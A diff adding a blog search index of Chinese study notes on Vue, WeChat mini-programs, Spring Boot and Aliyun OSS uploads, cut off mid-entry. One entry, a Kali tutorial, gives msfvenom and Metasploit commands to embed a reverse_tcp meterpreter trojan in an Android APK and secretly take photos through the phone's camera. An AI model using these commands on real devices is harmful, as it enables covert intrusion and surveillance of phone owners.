@@ -1,0 +1,441 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search> 
+  
+  
+    
+    <entry>
+      <title>vue实例</title>
+      <link href="/2023/01/01/vue%E5%AE%9E%E4%BE%8B/"/>
+      <url>/2023/01/01/vue%E5%AE%9E%E4%BE%8B/</url>
+      
+        <content type="html"><![CDATA[<p>vue实例就是你new出来的vue对象</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue@2.5.16/dist/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;&#123;a&#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> data = &#123;<span class="attr">a</span>:<span class="number">1</span>&#125;</span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 如果在此处使用Object.freeze()方法，则改变data中的值，不会影响到视图。如下</span></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// Object.freeze(data);</span></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 此方法将data变为只读</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript"><span class="attr">data</span>: data</span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 此处展示data中的a,且此时,data中的a和app中的a是同一个</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(data.<span class="property">a</span>);</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(data.<span class="property">a</span> == app.<span class="property">a</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 如果修改app中的a,data中的a也会改变，为双向绑定</span></span></span><br><span class="line"><span class="language-javascript">app.<span class="property">a</span> = <span class="number">100</span>;</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(data.<span class="property">a</span>)</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 但是，我在此处，于data实例中加入b元素,app中不会加入b</span></span></span><br><span class="line"><span class="language-javascript">data.<span class="property">b</span> = <span class="number">100</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(app.<span class="property">b</span>)   <span class="comment">// undefined</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(data.<span class="property">b</span>)</span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 假如我想一开始就加入一个b元素，但是我不知道b的值，可以定义b为null，例如：var data = &#123;a:1, b:null&#125;</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 获取到el这个元素</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(app.<span class="property">$el</span>==<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;app&quot;</span>));</span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 获取data</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(app.<span class="property">$data</span> == data);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="Vue实例生命周期："><a href="#Vue实例生命周期：" class="headerlink" title="Vue实例生命周期："></a>Vue实例生命周期：</h3><h4 id="生命周期过程："><a href="#生命周期过程：" class="headerlink" title="生命周期过程："></a>生命周期过程：</h4><ol><li>new Vue()实例化一个vue实例，然后init初始化event和lifecycle</li><li>执行beforeCeate生命周期函数</li><li>beforeCreate执行完后，进行数据初始化，定义data数据，方法以及事件</li><li>执行created生命周期函数。执行该函数的时候，可以拿到data下的数据以及methods下的方法，即，可调用方法进行数据请求</li><li>created执行完后，会判断当前是否有el参数。如果有，会再判断是否有template参数；如果没有，则等待调用$mount(el)方法</li><li>确保有了el之后，如果再往下判断是否有template参数。如果有，将template模板转化成render函数；如果没有，则将获取到的el编译成template,然后将这个template转换为render函数</li><li>再调用beforeMount</li><li>之后产生一个虚拟dom，进行保存，再将rander渲染成真实的dom</li><li>调用mounted</li><li>然后只有当数据变化时，触发beforeUpdate，将变化后的数据渲染到页面上，并且deforeUpate调用后，会重新生成一个新的虚拟dom，然后和原来的比较，算出最小更新范围，从而更新render之中的数据，再将render渲染成真实dom</li><li>beforeUpdate之后会执行update，具体过程和上一步差不多</li><li>之后就是beforeDestroy，此时仍可进行实例操作</li><li>销毁完成后，再执行destroyed</li></ol><h4 id="生命周期函数以及应用场景："><a href="#生命周期函数以及应用场景：" class="headerlink" title="生命周期函数以及应用场景："></a>生命周期函数以及应用场景：</h4><ul><li>beforeCreate（<strong>创建前</strong>）：常用于加loading</li><li>created（<strong>创建后</strong>）：loading结束后，做一些初始化，实现函数自执行</li><li>beforeMount（<strong>载入前</strong>）</li><li>mounted（<strong>载入后</strong>）：发起后端请求，拿回数据，配合路由钩子做一些事情</li><li>beforeUpdate（<strong>更新前</strong>）</li><li>updated（<strong>更新后</strong>）</li><li>beforeDestroy（<strong>销毁前</strong>）： 你确认删除XX吗？</li><li>destroyed（<strong>销毁后</strong>）：当前组件已被删除，清空相关内容</li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> vue </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> vue笔记 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>vue自定义组件</title>
+      <link href="/2022/12/31/vue%E8%87%AA%E5%AE%9A%E4%B9%89%E7%BB%84%E4%BB%B6/"/>
+      <url>/2022/12/31/vue%E8%87%AA%E5%AE%9A%E4%B9%89%E7%BB%84%E4%BB%B6/</url>
+      
+        <content type="html"><![CDATA[<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue@2.5.16/dist/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>组件<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 1.自定义标签 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mentaltest</span>&gt;</span><span class="tag">&lt;/<span class="name">mentaltest</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 2.自定义标签绑定固定值 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">jumparading</span> <span class="attr">num</span>=<span class="string">&quot;二&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">jumparading</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 3.自定义标签绑定变量 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hunter</span> <span class="attr">v-bind:three</span>=<span class="string">&quot;number&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">hunter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 1.自定义标签</span></span></span><br><span class="line"><span class="language-javascript"><span class="title class_">Vue</span>.<span class="title function_">component</span>(<span class="string">&#x27;mentaltest&#x27;</span>,&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">template</span>: <span class="string">&#x27;&lt;h1&gt; 这是第一个组件 &lt;h1&gt;&#x27;</span></span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 2.自定义标签绑定固定值</span></span></span><br><span class="line"><span class="language-javascript"><span class="title class_">Vue</span>.<span class="title function_">component</span>(<span class="string">&#x27;jumparading&#x27;</span>,&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">props</span>: [<span class="string">&#x27;num&#x27;</span>],</span></span><br><span class="line"><span class="language-javascript"><span class="attr">template</span>: <span class="string">&#x27;&lt;h2&gt; 这是第&#123;&#123;num&#125;&#125;个组件 &lt;h2&gt;&#x27;</span></span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 3.自定义标签绑定变量</span></span></span><br><span class="line"><span class="language-javascript"><span class="title class_">Vue</span>.<span class="title function_">component</span>(<span class="string">&#x27;hunter&#x27;</span>,&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">props</span>: [<span class="string">&#x27;three&#x27;</span>],</span></span><br><span class="line"><span class="language-javascript"><span class="attr">template</span>: <span class="string">&#x27;&lt;h2&gt; 这是第&#123;&#123;three&#125;&#125;个组件 &lt;h2&gt;&#x27;</span></span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript"><span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">number</span>:<span class="string">&#x27;三&#x27;</span></span></span><br><span class="line"><span class="language-javascript">&#125;,</span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> vue </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> vue笔记 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>微信小程序笔记（一）</title>
+      <link href="/2022/12/31/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/"/>
+      <url>/2022/12/31/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/</url>
+      
+        <content type="html"><![CDATA[<h3 id="一、项目结构"><a href="#一、项目结构" class="headerlink" title="一、项目结构"></a>一、项目结构</h3><ol><li><strong>pages</strong>：用来存放所有小程序页面</li><li><strong>utils</strong>：用来存放工具性质的模块（例如：格式化时间的自定义模块）</li><li><strong>app.js</strong>：小程序项目的入口文件</li><li><strong>app.json</strong>：小程序项目的全局配置文件</li><li><strong>app.wxss</strong>：小程序项目的全局样式文件</li><li><strong>project.config.json</strong>：项目的配置文件</li><li><strong>sitemap.json</strong>：用来配置小程序及其页面是否允许被微信索引</li></ol><h3 id="二、小程序的页面组成部分"><a href="#二、小程序的页面组成部分" class="headerlink" title="二、小程序的页面组成部分"></a>二、小程序的页面组成部分</h3><p>官方建议把所有小程序页面，都放在pages目录中，以单独文件夹存在，每个页面由4个基本文件组成：</p><ol><li><strong>.js</strong>文件（页面的脚本文件，存放页面的数据、事件处理函数等）</li><li><strong>.json</strong>文件（当前页面的配置文件，配置窗口的外观、表现等）</li><li><strong>.wxml</strong>文件（页面的模板结构文件）</li><li><strong>.wxss</strong>文件（当前页面的样式表文件）</li></ol><h3 id="三、小程序代码的构成-JSON配置文件"><a href="#三、小程序代码的构成-JSON配置文件" class="headerlink" title="三、小程序代码的构成 - JSON配置文件"></a>三、小程序代码的构成 - JSON配置文件</h3><p>JSON配置文件的作用：通过不同的<strong>.json</strong>配置文件，可以对小程序项目进行不同级别的配置</p><p>小程序中有4种JSON配置文件，分别为：</p><ol><li>项目根目录中的 <strong>app.json</strong> 配置文件：当前小程序的全局配置，包括了小程序的所有页面路径、窗口外观、界面表现、底部tab等,有以下几个主要配置项：<ol><li>pages: 用来记录当前小程序所有页面的路径</li><li>window：全局定义小程序所有页面的背景色、文字颜色等</li><li>style：全结定义小程序组件所使用的样式版本（默认v2）</li><li>sitemapLocation：用来指明 sitemap.json 的位置</li></ol></li><li>项目根目录中的 <strong>project.config.json</strong> 配置文件：项目配置文件，用来记录我们对小程序开发工具所做的个性化配置，例如：<ol><li>setting 中保存了编译相关的配置</li><li>projectname 中保存项目名称（可随意填写，不等于小程序名字）</li><li>appID 中保存小程序账号的ID（如果是在自己账号上运行别人的项目，记得把APPID改成自己的，否则容易报错）</li></ol></li><li>项目根目录中的 <strong>sitemap.json</strong> 配置文件：配置小程序页面是否允许微信索引。如果允许微信索引，微信会通过爬虫为小程序页面内容建立索引。当用户搜索关键词和页面的索引匹配成功时，小程序的页面将可能展示在搜索结果中。（<em>注：sitemap 的索引提示是默认开启的，如果需要关闭索引提示，可在peoject.config.json 的 setting 中配置字段 <strong>checkSiteMap</strong> 为 false</em>）</li><li>每个页面文件夹中的 <strong>.json</strong> 文件：</li></ol>]]></content>
+      
+      
+      <categories>
+          
+          <category> 微信小程序 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 微信小程序笔记 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>kali渗透测试android</title>
+      <link href="/2022/12/24/kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95android/"/>
+      <url>/2022/12/24/kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95android/</url>
+      
+        <content type="html"><![CDATA[<h4 id="环境-kali-linux"><a href="#环境-kali-linux" class="headerlink" title="环境: kali linux"></a>环境: kali linux</h4><h4 id="目标：一台安卓机"><a href="#目标：一台安卓机" class="headerlink" title="目标：一台安卓机"></a>目标：一台安卓机</h4><p>ifconfig查看虚拟机ip</p><p>在终端输入命令</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a java --platform android -p android/meterpreter/reverse_tcp lhost=虚拟机ip lport=监听端口（例：<span class="number">3333</span>） -x test.apk R &gt; apk.apk </span><br></pre></td></tr></table></figure><p>在/home/用户名 文件夹中找到apk.apk文件，想办法给手机安装（微信传输会添加拓展名，QQ不会）</p><p>在终端输入</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure><p>启动终端，然后一次输入下列</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.u</span>se exploit/multi/handler 加载模块</span><br><span class="line"><span class="number">2.</span><span class="built_in">set</span> payload android/meterpreter/reverse_tcp  选择Payload</span><br><span class="line"><span class="number">3.</span>show options 查看参数设置</span><br><span class="line"><span class="number">4.</span><span class="built_in">set</span> LHOST 虚拟机IP</span><br><span class="line"><span class="number">5.</span><span class="built_in">set</span> LPORT 监听端口（此处必须和前面一样）</span><br><span class="line"><span class="number">6.</span>exploit 开始监听</span><br></pre></td></tr></table></figure><p>如果手机上安装了木马，就会看见一个会话连接</p><p>以下是以下操作命令</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sysinfo 查看手机操作系统</span><br><span class="line">webcam_list 查看手机摄影头有几个</span><br><span class="line">webcam_snap 隐秘拍照功能</span><br><span class="line">webcam_stream 开启摄像头</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> linux笔记 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> linux </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>SpringBootApplication 注解</title>
+      <link href="/2022/12/18/SpringBootApplication-%E6%B3%A8%E8%A7%A3%E8%AF%A6%E8%A7%A3/"/>
+      <url>/2022/12/18/SpringBootApplication-%E6%B3%A8%E8%A7%A3%E8%AF%A6%E8%A7%A3/</url>
+      
+        <content type="html"><![CDATA[<h2 id="SpringBootApplication-注解"><a href="#SpringBootApplication-注解" class="headerlink" title="@SpringBootApplication 注解"></a>@SpringBootApplication 注解</h2><p>@SpringBootApplication是一个组合注解，主要由@SpringBootConfiguration、@EnableAutoConfiguration和@ComponentScan组成</p><h3 id="SpringBootConfiguration详解"><a href="#SpringBootConfiguration详解" class="headerlink" title="@SpringBootConfiguration详解"></a>@SpringBootConfiguration详解</h3><p>@SpringBootConfiguration实际上就是@Configuration，功能上没有太大区别</p><h4 id="Configuration-注解"><a href="#Configuration-注解" class="headerlink" title="@Configuration 注解"></a>@Configuration 注解</h4><p>表示该类为配置类，在里面注入Bean</p><h5 id="Configuration和-Component-的区别"><a href="#Configuration和-Component-的区别" class="headerlink" title="@Configuration和@Component 的区别"></a>@Configuration和@Component 的区别</h5><ol><li>spring容器在启动时会默认加载一些后置处理器，其中有个处理器就叫ConfigurationClassPostProcessor，这个处理器会专门处理带有@Configuration注解的类。它会将所有带有@Conguration的类存进指定容器，然后通过cglib代理进行增强，对于已经被创建的对象不会进行重新创建。而@Component则没有被代理，会重复创建对象。</li></ol><h3 id="EnableAutoConfiguration注解"><a href="#EnableAutoConfiguration注解" class="headerlink" title="@EnableAutoConfiguration注解"></a>@EnableAutoConfiguration注解</h3><p>开启自动化配置，主要依靠@Import和@AutoConfigurationPackage,实际上就是导入了两个配置类AutoConfigurationImportSelector和Registrar</p><h4 id="首先我们解析-import的作用："><a href="#首先我们解析-import的作用：" class="headerlink" title="首先我们解析@import的作用："></a>首先我们解析@import的作用：</h4><p>在原生的spring framework中，组件装配经历了三个阶段：</p><ol><li><p>spring 2.5+开始，可以使用@component等注解来装配bean</p></li><li><p>spring 3.0+开始，使用@Configuration + @bean的方式</p></li><li><p>spring 3.1+ 开始，使用模块装配，比如@EnableXXX + @Import，下为演示</p><ol><li><p>首先创建一个实体类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Apple</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>然后自定义一个注解</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="meta">@Target(ElementType.TYPE)</span></span><br><span class="line"><span class="meta">@Import(&#123;Apple.class&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> EnableFruit &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>在启动类中加入注解</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@EnableFruit</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DemoApplication</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        SpringApplication.run(DemoApplication.class, args);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>在测试类中进行测试</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@SpringBootTest</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DemoApplicationTests</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    Apple apple;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">contextLoads</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;apple = &quot;</span> + apple);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>如果在控制台看到下列结果，就可证明注入成功</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apple = com.example.demo.<span class="keyword">module</span>.Apple@75798d03</span><br></pre></td></tr></table></figure></li></ol></li></ol><h3 id="ComponentScan注解"><a href="#ComponentScan注解" class="headerlink" title="@ComponentScan注解"></a>@ComponentScan注解</h3><p>包扫描，<strong>默认情况下扫描的是当前这个类所在的包下面的所有类</strong>，所以建议放在根包下面，否则需要进行重新指定</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> java笔记 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> java </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>阿里云oss文件上传</title>
+      <link href="/2022/12/11/%E9%98%BF%E9%87%8C%E4%BA%91oss%E4%B8%8A%E4%BC%A0/"/>
+      <url>/2022/12/11/%E9%98%BF%E9%87%8C%E4%BA%91oss%E4%B8%8A%E4%BC%A0/</url>
+      
+        <content type="html"><![CDATA[<h1 id="阿里云oss文件上传"><a href="#阿里云oss文件上传" class="headerlink" title="阿里云oss文件上传"></a>阿里云oss文件上传</h1><h3 id="所需依赖"><a href="#所需依赖" class="headerlink" title="所需依赖"></a>所需依赖</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.aliyun.oss<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>aliyun-sdk-oss<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.10.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="其次获取到目标阿里云的AccessKey-ID和AccessKey-Secret填入yml中，如图所示"><a href="#其次获取到目标阿里云的AccessKey-ID和AccessKey-Secret填入yml中，如图所示" class="headerlink" title="其次获取到目标阿里云的AccessKey ID和AccessKey Secret填入yml中，如图所示"></a>其次获取到目标阿里云的AccessKey ID和AccessKey Secret填入yml中，如图所示</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">aliyun:</span></span><br><span class="line">  <span class="attr">oss:</span></span><br><span class="line">    <span class="attr">file:</span></span><br><span class="line">      <span class="attr">endpoint:</span> <span class="string">oss-cn-hangzhou.aliyuncs.com</span>   <span class="string">//</span> <span class="string">节点，此处为（华东1）杭州</span></span><br><span class="line">      <span class="attr">keyid:</span> <span class="string">LxxxxxxxxxxxxxW</span></span><br><span class="line">      <span class="attr">keysecret:</span> <span class="string">txxxxxxxxxxxRM</span></span><br><span class="line">      <span class="attr">bucketname:</span> <span class="string">leebook</span>     <span class="string">//</span> <span class="string">目标桶名称</span></span><br></pre></td></tr></table></figure><h3 id="编写OSS工具类OssUtils"><a href="#编写OSS工具类OssUtils" class="headerlink" title="编写OSS工具类OssUtils"></a>编写OSS工具类OssUtils</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 